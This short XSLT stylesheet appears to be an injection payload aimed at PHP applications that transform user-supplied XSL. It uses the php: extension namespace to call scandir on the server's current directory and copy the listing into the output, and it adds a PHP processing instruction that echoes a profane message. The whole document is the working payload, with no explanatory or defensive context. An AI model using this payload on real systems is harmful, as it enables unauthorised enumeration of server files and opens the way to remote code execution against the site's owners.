<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:copy-of select="php:function('scandir','.')"/>
<xsl:processing-instruction name="php">
    echo "hello mother fucker";

</xsl:processing-instruction>
</xsl:template>
</xsl:stylesheet>
